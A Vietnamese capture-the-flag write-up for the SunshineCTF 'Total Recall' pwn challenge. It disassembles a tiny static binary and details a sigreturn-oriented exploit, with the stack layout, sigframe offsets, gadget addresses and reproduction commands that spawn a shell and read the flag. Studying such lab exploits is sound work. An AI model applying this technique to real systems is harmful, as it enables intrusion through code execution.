# Total Recall — Pwn (Medium)

`Can you recall how to get out of this one?`

SunshineCTF 2026, pwn, 497 điểm, tác giả Oreomeister. File cho tải: `total_recall`.
**Remote:** `nc chal.sunshinectf.games 26003`.

## Đề bài

Đề chỉ có đúng một dòng như trên: không hint kỹ thuật, không ghi libc, không có script
tham khảo. Mọi kết luận dưới đây đều rút ra từ chính binary.

## Phân tích ban đầu

```
Type: EXEC (không PIE), statically linked, stripped, entry 0x401000
phnum = 2: LOAD 0x400000 R (0xb0) | LOAD 0x401000 R+X (0x6c)
không có PT_GNU_STACK
```

`Type: EXEC` nghĩa là không PIE, nên mọi địa chỉ code là hằng số, không cần leak code
segment. Toàn bộ chương trình chỉ có 108 byte (`analysis/disasm.txt`):

```
401000  call f1
401005  call f2
40100a  mov rax,60 ; xor rdi,rdi ; syscall                          exit(0)

401016  push rsp                                                    f1: leak
        mov rsi,rsp ; mov rdi,1 ; mov rdx,8 ; mov rax,1 ; syscall   write(1, rsp, 8)
401031  pop rax
401032  lea rsi,[rsp-0x40] ; mov rdi,0 ; mov rdx,0x18 ; mov rax,0 ; syscall   read(0, rsp-0x40, 24)
40104e  ret

40104f  lea rsi,[rsp-0x80] ; mov rdi,0 ; mov rdx,0x400 ; mov rax,0 ; syscall  read(0, rsp-0x80, 1024)
40106b  ret
```

Bốn điểm rút ra từ 108 byte đó:

1. Leak là một con trỏ stack thuần, little-endian, không có banner: `write` lấy
   `rsi = rsp` ngay sau `push rsp`.
2. f2 đọc 1024 byte vào vùng `rsp-0x80` trong khi return address nằm tại `rsp+0x80`,
   tức offset 0x80 tính từ đầu buffer. Đây là overflow thuận, với 1024 byte tùy chọn.
3. `read` không dừng ở byte 0x00, nên payload được phép chứa mọi byte.
4. `read` trả về số byte đọc được trong `rax`. Kết hợp với việc binary có sẵn
   `syscall; ret` trần, đây chính là cửa thoát.

## Giả thuyết đã loại trừ

| # | Giả thuyết | Kết quả |
|---|---|---|
| H2 | Thiếu PT_GNU_STACK nên `READ_IMPLIES_EXEC`, stack chạy được, đặt shellcode vào buffer là xong | DEAD: nhảy vào buffer chết im, dù đã thử hai cách tính `buf` và có NOP sled 0x50 byte bao cả hai. Máy chủ NX. |
| H5 | sigframe bắt đầu bằng 128 byte `siginfo` (`sigcontext` tại `frame+0xA8`) | DEAD: kiểu này trả về 0 byte; kiểu `sigcontext` tại `frame+0x28` mới trả về dữ liệu. |
| H7 | `buf = L - 0x78` (tin rằng `push rsp` lưu giá trị sau khi trừ) | DEAD: sửa thành `L - 0x80` bằng một phép đo không phụ thuộc semantic của `push`. |
| H8 | Dữ liệu ở `buf+0x300` chưa kịp vào bộ nhớ do `read` trả ngắn | NỬA ĐÚNG: là cái bẫy thật nên tránh, nhưng không phải nguyên nhân chính. |
| H9 | seccomp chặn `execve` | DEAD: `execve("/no/such/file")` trả lỗi rõ ràng; `execve("/bin/sh")` im lặng vì nó thành công. |

## Chuỗi khai thác

### Bước 1 - xác định hình học stack bằng ROP thuần, không dính giả thuyết

`RET_OFF = 0x80` và việc `ret` của f2 để lại `rsp = buf+0x88` được xác nhận bằng chuỗi
chỉ dùng đúng hai gadget của chương trình (`analysis/probe_exec.py`, `analysis/walk_leak.py`).

Vì mọi leak đều đi qua `push rsp`, sai số 8 byte của `buf` không thể phát hiện bằng leak.
Phép đo dùng ở đây là `analysis/measure_rsp.py`: đặt vào mỗi ô của frame một sentinel
`buf+0x300+j`, cho sigframe nhảy về `0x401000`; chương trình start lại sẽ leak
`rsp - 16`, con số trả về chỉ đúng ô `0xA0`. Suy ngược lại, `delta` phải là
**`buf = L - 0x80`**.

Có một cách kiểm tra độc lập không dùng sigreturn: gadget `0x401032` nuốt input và đẩy
`rsp` lên 8 mỗi lần, nên gọi nó `k` lần rồi nhảy vào `0x401017` sẽ leak đúng
`buf+0x88+8k`. Cả năm giá trị cài cắm đều khớp.

### Bước 2 - dùng `read` nạp `__NR_rt_sigreturn` vào `rax`

Binary có sẵn `syscall; ret` trần tại `0x40104c` và `0x401069` (nhảy vào sau lệnh
`mov rax,0` của chuỗi bên dưới). Gadget tại `0x401032` gọi `read(0, rsp-0x40, 24)` và để
lại số byte đọc được trong `rax`. Chỉ cần gửi đúng 15 byte thì `rax = 15`:

```
[buf+0x80] = 0x401032   read(0, buf+0x48, 24) -> rax = 15, ret
[buf+0x88] = 0x401069   syscall               -> rt_sigreturn, frame lấy tại [rsp] = buf+0x90
```

`rsp` tại thời điểm syscall là `buf+0x90`, nên sigframe đặt ngay tại đó.

### Bước 3 - sigframe

Kernel trên máy chủ đọc `ucontext` bắt đầu ngay tại `rsp` (không có 128 byte `siginfo`
đứng trước), nên `sigcontext` nằm ở `frame+0x28`:

```
frame+0x68 rdi    frame+0x70 rsi    frame+0x88 rdx    frame+0x90 rax = 59
frame+0xA0 rsp    frame+0xA8 rip    frame+0xB0 eflags = 0x246
frame+0xB8 cs=0x33, gs=0, fs=0, ss=0x2b               frame+0xD8 fpstate = 0
```

`rip = 0x401069`: sau khi sigreturn trả ngữ cảnh, lệnh `syscall` chạy lại, nhưng lần này
với `rax = 59`, tức `execve(rdi, rsi, rdx)`. `rsp` trỏ vào ô `buf+0x78` chứa `0x401000`,
đây là cái mồi: nếu `execve` trả về lỗi thì lệnh `ret` cuối f2 sẽ nhảy về đó và chương
trình start lại (leak thêm 8 byte); nếu hoàn toàn im lặng nghĩa là `execve` đã thành công.

Bố trí buffer, mọi thứ nằm trong 512 byte đầu; vùng `buf+0x40..0x57` bị hai lệnh `read`
ghi đè nên để trống:

```
0x00  argv = { &"/bin/sh", NULL }
0x20  "/bin/sh"
0x78  0x401000                        <- rsp sau sigreturn, mồi chẩn đoán
0x80  0x401032      0x88  0x401069
0x90  sigframe
```

### Bước 4 - kiểm chứng từng thanh ghi trước khi đánh execve

`analysis/probe_args.py` nhảy vào giữa chuỗi `write` của f1, tại đó `rsi`/`rdi`/`rdx`/`rax`
**chỉ có thể đến từ frame**:

```
0x401017 -> 8 byte    (rsi = rsp)
0x401021 -> 8 byte    (thêm rdi, rsi từ frame)
0x401028 -> 24 byte   (thêm rdx từ frame)
0x401069 -> 24 byte   (thêm rax từ frame)  <== toàn quyền với một syscall tùy chọn
```

Cả bậc thang đều khớp, nên frame được nạp đầy đủ. `analysis/probe_syscall_allow.py` sau
đó dùng chính cơ chế mồi để kiểm tra syscall nào được phép.

## Flag
```
sun{r3caLl_ev3Ry_reGist3r_sR0p}
```

Cờ nằm trong `/ctf/flag.txt` (32 byte, chủ `root:total_recall`, chế độ `-rw-r-----`);
shell dành được có quyền đọc tệp này.

## Reproduce

```bash
python exploit.py                              # mặc định: cat /ctf/flag.txt + ls -la /ctf /home
python exploit.py 'id' 'cat /ctf/flag.txt'     # mỗi argv một lệnh, gửi lần lượt
python analysis/probe_args.py                  # bậc thang đo từng thanh ghi của sigframe
python analysis/measure_rsp.py                 # đo lại delta buf = L - 0x80
```

`exploit.py` chỉ dùng stdlib, tự nối vào `chal.sunshinectf.games:26003` và leak lại base ở mỗi
lần chạy; ngoài các gadget của chính binary thì không có địa chỉ hardcode nào khác.
`analysis/disasm.txt` là toàn bộ 108 byte của chương trình.
